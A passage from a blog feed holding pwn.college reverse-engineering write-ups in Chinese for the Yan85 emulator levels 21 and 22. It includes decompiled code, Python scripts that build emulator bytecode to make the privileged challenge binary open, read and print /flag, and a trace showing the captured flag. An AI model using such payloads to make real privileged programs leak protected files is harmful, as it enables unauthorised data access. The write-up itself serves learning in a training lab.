class="token punctuation">)</span>                <span class="token keyword">if</span> stderr<span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>stderr<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>                        <span class="token keyword">except</span> subprocess<span class="token punctuation">.</span>TimeoutExpired<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Operation: stm=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>stm<span class="token punctuation">&#125;</span></span><span class="token string">, Registers: a=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>a<span class="token punctuation">&#125;</span></span><span class="token string">, b=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token string">, c=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">, sys: read=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>read<span class="token punctuation">&#125;</span></span><span class="token string">, write=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>write<span class="token punctuation">&#125;</span></span><span class="token string">, open=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>open_<span class="token punctuation">&#125;</span></span><span class="token string"> - Timed out"</span></span><span class="token punctuation">)</span>                process<span class="token punctuation">.</span>kill<span class="token punctuation">(</span><span class="token punctuation">)</span>                stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> process<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment"># print(f"Output after timeout: &#123;stdout.decode()&#125;")</span>                <span class="token keyword">if</span> stderr<span class="token punctuation">:</span>                    <span class="token keyword">pass</span>                    <span class="token comment"># print(f"Error after timeout: &#123;stderr.decode()&#125;")</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Writeup</title>
      <link href="/2024/06/10/pwn-college-rev-22-0-writeup/"/>
      <url>/2024/06/10/pwn-college-rev-22-0-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/program-security/reverse-engineering">https://pwn.college/program-security/reverse-engineering</a></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240610223520.png" alt="20240610223520"></p><h2 id="遗留思考的问题"><a href="#遗留思考的问题" class="headerlink" title="遗留思考的问题"></a>遗留思考的问题</h2><ol><li><p>Linux的权限管理是如何管理的，用户权限、读写权限、运行程序的权限、以及程序是否拥有读取文件的权限？</p></li><li><p>调试器和被调试程序之间的关系？如何完成调试过程，他们之前的权限关系是怎么样的？</p></li></ol><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>由于程序在最初会读取<code>flag</code>文件的内容去生成种子，所以我想能不能通过调试这个程序来获取其在内存中存放的<code>flag</code>文件的内容。但还是权限的问题，因为本身我<code>hacker</code>用户是没有读取<code>flag</code>文件的权限的，而<code>baby</code>这个程序拥有读取<code>flag</code>文件的权限，我拥有运行<code>baby</code>程序的权限。但是调试程序虽然可以调试<code>baby</code>程序，可是调试程序没有读取<code>flag</code>文件的权限，所以调试程序哪怕可以调试<code>baby</code>程序，依旧会在程序断言处报错。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">fd &#x3D; open(&quot;&#x2F;flag&quot;, 0);if ( fd &lt; 0 )  __assert_fail(&quot;fd &gt;&#x3D; 0&quot;, &quot;&lt;stdin&gt;&quot;, 0x11u, &quot;flag_seed&quot;);if ( read(fd, buf, 0x80uLL) &lt;&#x3D; 0 )  __assert_fail(&quot;read(fd, flag, 128) &gt; 0&quot;, &quot;&lt;stdin&gt;&quot;, 0x12u, &quot;flag_seed&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>这个跟以往不同的是，各个寄存器、系统调用、指令类别对应的特征数之前是确定的。比如<code>a</code>对应<code>0x01</code>、<code>imm</code>对应<code>0x01</code>。现在它会根据flag文件中的内容生成一个数，然后将这个数作为种子，随机确定各个寄存器、系统调用、指令类别所对应的特征数。</p><p>观察下面这个函数，就可以发现这个<code>seed</code>在flag文件中的内容确定之后，就变成确定的了。而根据之前对随机函数的了解，如果种子是确定的话，那么多次运行生成的随机数序列是相同的，譬如无论运行多少次，生成的都是<code>1、2、3、4</code>。</p><p>所以，后续我们要做的，就是根据特征数<code>0x1、0x2、0x4、0x8、0x10、0x20、0x40、0x80</code>尝试其对应的寄存器、系统调用、指令类别。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">unsigned __int64 flag_seed()&#123;  unsigned int seed; &#x2F;&#x2F; [rsp+4h] [rbp-9Ch]  unsigned int i; &#x2F;&#x2F; [rsp+8h] [rbp-98h]  int fd; &#x2F;&#x2F; [rsp+Ch] [rbp-94h]  __int64 buf[17]; &#x2F;&#x2F; [rsp+10h] [rbp-90h] BYREF  unsigned __int64 v5; &#x2F;&#x2F; [rsp+98h] [rbp-8h]  v5 &#x3D; __readfsqword(0x28u);  memset(buf, 0, 128);  fd &#x3D; open(&quot;&#x2F;flag&quot;, 0);  if ( fd &lt; 0 )    __assert_fail(&quot;fd &gt;&#x3D; 0&quot;, &quot;&lt;stdin&gt;&quot;, 0x11u, &quot;flag_seed&quot;);  if ( read(fd, buf, 0x80uLL) &lt;&#x3D; 0 )    __assert_fail(&quot;read(fd, flag, 128) &gt; 0&quot;, &quot;&lt;stdin&gt;&quot;, 0x12u, &quot;flag_seed&quot;);  seed &#x3D; 0;  for ( i &#x3D; 0; i &lt;&#x3D; 0x1F; ++i )    seed ^&#x3D; *((_DWORD *)buf + (int)i);  srand(seed);  memset(buf, 0, 0x80uLL);  return __readfsqword(0x28u) ^ v5;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没想到这次居然一次就过了，看来还是有在慢慢进步的！</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">def <span class="token function">write_binary_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> data_list<span class="token punctuation">)</span><span class="token operator">:</span>    # 以二进制写模式打开文件    with <span class="token function">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token char">'wb'</span><span class="token punctuation">)</span> as f<span class="token operator">:</span>        <span class="token keyword">for</span> data in data_list<span class="token operator">:</span>            # 将二进制数据写入文件            f<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span># 示例数据：将几个二进制块写入文件data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">b</span><span class="token char">'\x20\x20\x20'</span> <span class="token expression"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">STM</span></span></span></span>    b<span class="token char">'\x40\x10\x10'</span> # IMM a <span class="token operator">=</span> \x10    b<span class="token char">'\x40\x2f\x08'</span> # IMM b <span class="token operator">=</span> \x2f    b<span class="token char">'\x01\x08\x10'</span> # stm <span class="token operator">*</span>a <span class="token operator">=</span> b    b<span class="token char">'\x40\x11\x10'</span> # IMM a <span class="token operator">=</span> \x11    b<span class="token char">'\x40\x66\x08'</span> # IMM b <span class="token operator">=</span> \x66    b<span class="token char">'\x01\x08\x10'</span> # stm <span class="token operator">*</span>a <span class="token operator">=</span> b    b<span class="token char">'\x40\x12\x10'</span> # IMM a <span class="token operator">=</span> \x12    b<span class="token char">'\x40\x6c\x08'</span> # IMM b <span class="token operator">=</span> \x6c    b<span class="token char">'\x01\x08\x10'</span> # stm <span class="token operator">*</span>a <span class="token operator">=</span> b        b<span class="token char">'\x40\x13\x10'</span> # IMM a <span class="token operator">=</span> \x13    b<span class="token char">'\x40\x61\x08'</span> # IMM b <span class="token operator">=</span> \x61    b<span class="token char">'\x01\x08\x10'</span> # stm <span class="token operator">*</span>a <span class="token operator">=</span> b    b<span class="token char">'\x40\x14\x10'</span> # IMM a <span class="token operator">=</span> \x14    b<span class="token char">'\x40\x67\x08'</span> # IMM b <span class="token operator">=</span> \x67    b<span class="token char">'\x01\x08\x10'</span> # stm <span class="token operator">*</span>a <span class="token operator">=</span> b        b<span class="token char">'\x40\x15\x10'</span> # IMM a <span class="token operator">=</span> \x15    b<span class="token char">'\x40\x00\x08'</span> # IMM b <span class="token operator">=</span> \x00    b<span class="token char">'\x01\x08\x10'</span> # stm <span class="token operator">*</span>a <span class="token operator">=</span> b    b<span class="token char">'\x40\x00\x08'</span> # IMM b <span class="token operator">=</span> \x00    b<span class="token char">'\x40\x10\x10'</span> # IMM a <span class="token operator">=</span> \x10    b<span class="token char">'\x20\x10\x80'</span> # open  <span class="token operator">--</span> <span class="token keyword">return</span> file <span class="token operator">-></span> a    b<span class="token char">'\x40\x60\x40'</span><span class="token punctuation">,</span> # imm c <span class="token operator">=</span> <span class="token number">0x60</span>      b<span class="token char">'\x40\x20\x08'</span><span class="token punctuation">,</span> # imm b <span class="token operator">=</span> <span class="token number">0x20</span>      b<span class="token char">'\x20\x10\x10'</span><span class="token punctuation">,</span> # <span class="token function">read</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span> <span class="token operator">--</span><span class="token keyword">return</span> bytes <span class="token operator">-></span> a    b<span class="token char">'\x40\x60\x40'</span><span class="token punctuation">,</span> # imm c <span class="token operator">=</span> <span class="token number">0x60</span>       b<span class="token char">'\x40\x01\x10'</span><span class="token punctuation">,</span> # imm a <span class="token operator">=</span> <span class="token number">0x01</span>     b<span class="token char">'\x20\x10\x02'</span><span class="token punctuation">,</span> # write  <span class="token operator">--</span><span class="token operator">-</span><span class="token keyword">return</span> bytes <span class="token operator">-></span> a    b<span class="token char">'\x20\x10\x20'</span> # exit<span class="token punctuation">]</span><span class="token string">""</span>"STM \x01       i    sleepJMP \x02       f    write    STK \x04       d     CMP \x08       b    read_codeLDM \x10       a    read_memorySYS \x20            exitIMM \x40       cADD \x80       s    open<span class="token string">""</span>"# 目标文件路径file_path <span class="token operator">=</span> r<span class="token char">'/home/hacker/Test/output3'</span># 调用函数写入二进制数据<span class="token function">write_binary_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> data_list<span class="token punctuation">)</span># 验证写入的数据with <span class="token function">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token char">'rb'</span><span class="token punctuation">)</span> as f<span class="token operator">:</span>    content <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Writeup</title>
      <link href="/2024/06/08/pwn-college-rev-21-0-writeup/"/>
      <url>/2024/06/08/pwn-college-rev-21-0-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/program-security/reverse-engineering">https://pwn.college/program-security/reverse-engineering</a></p><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240608175412.png" alt="20240608175412"></p><p>这里面有个地方需要注意： </p><p>这个里面<code>a2</code>的值是我可以控制的，如果是这样的话，岂不是任意地址都可以写入了？这样做会不会破坏程序的运行空间？</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">write_memory</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int8 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  result <span class="token operator">=</span> a2<span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> a2 <span class="token operator">+</span> <span class="token number">0x300</span><span class="token punctuation">)</span> <span class="token operator">=</span> a3<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用户输入（模拟架构程序）是放在<code>buf</code>变量里面的，<code>buf</code>变量放在栈空间上。它的大小有<code>0x400</code>，那模拟程序架构的代码空间大小为<code>0x300</code>，<code>0x300</code>之后的空间是模拟架构寄存器的存放空间以及模拟内存。</p><p>后面代码写入<code>\flag</code>的位置，即是在<code>0x300+0x10</code>的位置。</p><h2 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h2><p>一开始我没打算往内存中写入<code>\flag</code>，想利用模拟程序的栈空间写入<code>\flag</code>。</p><p>后来我发现open函数的第一个参数是应该是<code>\flag</code>首字符的地址，但是栈空间的地址我没有办法知道。</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">if ( (a2 &amp; 0x80000) !&#x3D; 0 )&#123;  puts(&quot;[s] ... open&quot;);  v3 &#x3D; open((const char *)&amp;a1[a1[1024] + 768], a1[1025], a1[1026]);  write_register(a1, (unsigned __int8)a2, v3);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>后来，发现，只能利用模拟程序的写入内存操作，将字符串写入特定的地址，然后再把地址传递给open函数</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">  LOBYTE(v2) &#x3D; read_register(a1, (unsigned __int8)a2);  v4 &#x3D; read_register(a1, BYTE2(a2));  return write_memory(a1, v4, (char)v2);&#x2F;&#x2F; write_memory__int64 __fastcall write_memory(__int64 a1, unsigned __int8 a2, char a3)&#123;  __int64 result; &#x2F;&#x2F; rax  result &#x3D; a2;  *(_BYTE *)(a1 + a2 + 0x300) &#x3D; a3;  return result;&#125;  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="21"><a href="#21" class="headerlink" title="21"></a>21</h2><p>本关卡程序需要自己来写，之前关卡的程序思路是接受你的输入，然后通过算法判断输入与内存数据是否相等，相等则打开flag文件显示flag。</p><p>flag文件所在的位置在根目录，hacker用户没有访问权限，但是关卡所给出的二进制程序可以访问。</p><p>所以我们的思路也很明确，利用模拟架构向程序写入 <code>/flag</code>即flag文件的路径，然后通过模拟架构的系统调用，打开文件、读取文件、向标准输出显示。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">write_binary_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> data_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 以二进制写模式打开文件</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        <span class="token keyword">for</span> data <span class="token keyword">in</span> data_list<span class="token punctuation">:</span>            <span class="token comment"># 将二进制数据写入文件</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment"># 示例数据：将几个二进制块写入文件</span>data_list <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">b'\x10\x40\x10'</span><span class="token punctuation">,</span><span class="token comment"># imm a = 0x10</span>    <span class="token string">b'\x2f\x40\x08'</span><span class="token punctuation">,</span><span class="token comment"># imm b = 0x2f</span>    <span class="token string">b'\x08\x80\x10'</span><span class="token punctuation">,</span><span class="token comment"># stm *a = b</span>      <span class="token string">b'\x11\x40\x10'</span><span class="token punctuation">,</span><span class="token comment"># imm a = 0x11</span>    <span class="token string">b'\x66\x40\x08'</span><span class="token punctuation">,</span><span class="token comment"># imm b = 0x66</span>    <span class="token string">b'\x08\x80\x10'</span><span class="token punctuation">,</span><span class="token comment"># stm *a = b</span>    <span class="token string">b'\x12\x40\x10'</span><span class="token punctuation">,</span><span class="token comment"># imm a = 0x12</span>    <span class="token string">b'\x6c\x40\x08'</span><span class="token punctuation">,</span><span class="token comment"># imm b = 0x6c</span>    <span class="token string">b'\x08\x80\x10'</span><span class="token punctuation">,</span><span class="token comment"># stm *a = b</span>        <span class="token string">b'\x13\x40\x10'</span><span class="token punctuation">,</span><span class="token comment"># imm a = 0x13</span>    <span class="token string">b'\x61\x40\x08'</span><span class="token punctuation">,</span><span class="token comment"># imm b = 0x61</span>    <span class="token string">b'\x08\x80\x10'</span><span class="token punctuation">,</span><span class="token comment"># stm *a = b</span>      <span class="token string">b'\x14\x40\x10'</span><span class="token punctuation">,</span><span class="token comment"># imm a = 0x14</span>    <span class="token string">b'\x67\x40\x08'</span><span class="token punctuation">,</span><span class="token comment"># imm b = 0x67</span>    <span class="token string">b'\x08\x80\x10'</span><span class="token punctuation">,</span><span class="token comment"># stm *a = b</span>      <span class="token string">b'\x15\x40\x10'</span><span class="token punctuation">,</span><span class="token comment"># imm a = 0x15</span>    <span class="token string">b'\x00\x40\x08'</span><span class="token punctuation">,</span><span class="token comment"># imm b = 0x00</span>    <span class="token string">b'\x08\x80\x10'</span><span class="token punctuation">,</span><span class="token comment"># stm *a = b</span>      <span class="token string">b'\x10\x40\x08'</span><span class="token punctuation">,</span> <span class="token comment"># imm b = 0x00</span>    <span class="token string">b'\x10\x40\x10'</span><span class="token punctuation">,</span> <span class="token comment"># imm a = 0x10      </span>    <span class="token string">b'\x10\x01\x08'</span><span class="token punctuation">,</span> <span class="token comment"># open</span>       <span class="token string">b'\x60\x40\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm c = 0x60  </span>    <span class="token string">b'\x20\x40\x08'</span><span class="token punctuation">,</span> <span class="token comment"># imm b = 0x20  </span>    <span class="token string">b'\x10\x01\x20'</span><span class="token punctuation">,</span> <span class="token comment"># read(a, b, c)</span>      <span class="token string">b'\x60\x40\x01'</span><span class="token punctuation">,</span> <span class="token comment"># imm c = 0x60   </span>    <span class="token string">b'\x00\x40\x10'</span><span class="token punctuation">,</span> <span class="token comment"># imm a = 0x01 标准输出去写</span>    <span class="token string">b'\x01\x01\x02'</span><span class="token punctuation">,</span> <span class="token comment">#write</span>      <span class="token string">b'\x01\x01\x01'</span><span class="token punctuation">,</span> <span class="token comment">#exit</span><span class="token punctuation">]</span><span class="token comment"># 目标文件路径</span>file_path <span class="token operator">=</span> <span class="token string">r'.\output.bin'</span><span class="token comment"># 调用函数写入二进制数据</span>write_binary_file<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> data_list<span class="token punctuation">)</span><span class="token comment"># 验证写入的数据</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token triple-quoted-string string">"""[+] Welcome to challenge/babyrev_level21.0![+] This challenge is an custom emulator. It emulates a completely custom[+] architecture that we call "Yan85"! You'll have to understand the[+] emulator to understand the architecture, and you'll have to understand[+] the architecture to understand the code being emulated, and you will[+] have to understand that code to get the flag. Good luck![+][+] This level is a full Yan85 emulator. You'll have to reason about yancode,[+] and the implications of how the emulator interprets it![!] This time, YOU'RE in control! Please input your yancode: [+] Starting interpreter loop! Good luck![V] a:0 b:0 c:0 d:0 s:0 i:0x1 f:0[I] op:0x40 arg1:0x10 arg2:0x10[s] IMM a = 0x10[V] a:0x10 b:0 c:0 d:0 s:0 i:0x2 f:0[I] op:0x40 arg1:0x8 arg2:0x2f[s] IMM b = 0x2f[V] a:0x10 b:0x2f c:0 d:0 s:0 i:0x3 f:0[I] op:0x80 arg1:0x10 arg2:0x8[s] STM *a = b[V] a:0x10 b:0x2f c:0 d:0 s:0 i:0x4 f:0[I] op:0x40 arg1:0x10 arg2:0x11[s] IMM a = 0x11[V] a:0x11 b:0x2f c:0 d:0 s:0 i:0x5 f:0[I] op:0x40 arg1:0x8 arg2:0x66[s] IMM b = 0x66[V] a:0x11 b:0x66 c:0 d:0 s:0 i:0x6 f:0[I] op:0x80 arg1:0x10 arg2:0x8[s] STM *a = b[V] a:0x11 b:0x66 c:0 d:0 s:0 i:0x7 f:0[I] op:0x40 arg1:0x10 arg2:0x12[s] IMM a = 0x12[V] a:0x12 b:0x66 c:0 d:0 s:0 i:0x8 f:0[I] op:0x40 arg1:0x8 arg2:0x6c[s] IMM b = 0x6c[V] a:0x12 b:0x6c c:0 d:0 s:0 i:0x9 f:0[I] op:0x80 arg1:0x10 arg2:0x8[s] STM *a = b[V] a:0x12 b:0x6c c:0 d:0 s:0 i:0xa f:0[I] op:0x40 arg1:0x10 arg2:0x13[s] IMM a = 0x13[V] a:0x13 b:0x6c c:0 d:0 s:0 i:0xb f:0[I] op:0x40 arg1:0x8 arg2:0x61[s] IMM b = 0x61[V] a:0x13 b:0x61 c:0 d:0 s:0 i:0xc f:0[I] op:0x80 arg1:0x10 arg2:0x8[s] STM *a = b[V] a:0x13 b:0x61 c:0 d:0 s:0 i:0xd f:0[I] op:0x40 arg1:0x10 arg2:0x14[s] IMM a = 0x14[V] a:0x14 b:0x61 c:0 d:0 s:0 i:0xe f:0[I] op:0x40 arg1:0x8 arg2:0x67[s] IMM b = 0x67[V] a:0x14 b:0x67 c:0 d:0 s:0 i:0xf f:0[I] op:0x80 arg1:0x10 arg2:0x8[s] STM *a = b[V] a:0x14 b:0x67 c:0 d:0 s:0 i:0x10 f:0[I] op:0x40 arg1:0x10 arg2:0x15[s] IMM a = 0x15[V] a:0x15 b:0x67 c:0 d:0 s:0 i:0x11 f:0[I] op:0x40 arg1:0x8 arg2:0[s] IMM b = 0[V] a:0x15 b:0 c:0 d:0 s:0 i:0x12 f:0[I] op:0x80 arg1:0x10 arg2:0x8[s] STM *a = b[V] a:0x15 b:0 c:0 d:0 s:0 i:0x13 f:0[I] op:0x40 arg1:0x8 arg2:0x10[s] IMM b = 0x10[V] a:0x15 b:0x10 c:0 d:0 s:0 i:0x14 f:0[I] op:0x40 arg1:0x10 arg2:0x10[s] IMM a = 0x10[V] a:0x10 b:0x10 c:0 d:0 s:0 i:0x15 f:0[I] op:0x1 arg1:0x8 arg2:0x10[s] SYS 0x8 a[s] ... open[s] ... return value (in register a): 0x3[V] a:0x3 b:0x10 c:0 d:0 s:0 i:0x16 f:0[I] op:0x40 arg1:0x1 arg2:0x60[s] IMM c = 0x60[V] a:0x3 b:0x10 c:0x60 d:0 s:0 i:0x17 f:0[I] op:0x40 arg1:0x8 arg2:0x20[s] IMM b = 0x20[V] a:0x3 b:0x20 c:0x60 d:0 s:0 i:0x18 f:0[I] op:0x1 arg1:0x20 arg2:0x10[s] SYS 0x20 a[s] ... read_memory[s] ... return value (in register a): 0x39[V] a:0x39 b:0x20 c:0x60 d:0 s:0 i:0x19 f:0[I] op:0x40 arg1:0x1 arg2:0x60[s] IMM c = 0x60[V] a:0x39 b:0x20 c:0x60 d:0 s:0 i:0x1a f:0[I] op:0x40 arg1:0x10 arg2:0x1[s] IMM a = 0x1[V] a:0x1 b:0x20 c:0x60 d:0 s:0 i:0x1b f:0[I] op:0x1 arg1:0x2 arg2:0x1[s] SYS 0x2 c[s] ... writepwn.college&#123;U12e5jno_xl8vQmh9fN-p_fqO_Q.0VN4IDL0czNxEzW&#125;[s] ... return value (in register c): 0x60[V] a:0x1 b:0x20 c:0x60 d:0 s:0 i:0x1c f:0[I] op:0x1 arg1:0x1 arg2:0x1[s] SYS 0x1 c[s] ... exit"""</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑还是比较简单的，是一个位移加密的操作.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">adder <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0xf8</span><span class="token punctuation">,</span><span class="token number">0xe1</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span>    <span class="token number">0x32</span><span class="token punctuation">,</span><span class="token number">0x91</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x22</span><span class="token punctuation">,</span>    <span class="token number">0x22</span><span class="token punctuation">,</span><span class="token number">0x8a</span><span class="token punctuation">,</span><span class="token number">0xdc</span><span class="token punctuation">,</span><span class="token number">0xaa</span><span class="token punctuation">,</span>    <span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xb7</span><span class="token punctuation">,</span><span class="token number">0x67</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span>    <span class="token number">0xad</span><span class="token punctuation">,</span><span class="token number">0x8d</span><span class="token punctuation">,</span><span class="token number">0xf6</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span>    <span class="token number">0xba</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">read_binary_file_in_chunks</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> start_position<span class="token operator">=</span><span class="token number">0x39a</span> <span class="token punctuation">,</span>chunk_size<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>  <span class="token comment"># 以二进制模式打开文件</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            f<span class="token 